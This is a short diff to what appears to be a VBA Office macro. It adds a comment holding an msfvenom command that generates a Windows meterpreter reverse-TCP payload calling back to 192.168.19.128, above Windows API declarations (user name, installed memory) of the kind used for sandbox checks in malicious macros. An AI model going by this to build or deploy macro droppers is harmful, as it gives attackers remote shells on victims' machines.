@@ -1,3 +1,5 @@
+'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.19.128 EXITFUNC=thread -f vbapplication
+
 Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Boolean
 Private Declare PtrSafe Function GetPhysicallyInstalledSystemMemory Lib "Kernel32.dll" (ByRef TotalMemoryInKilobytes As LongLong) As Boolean
 
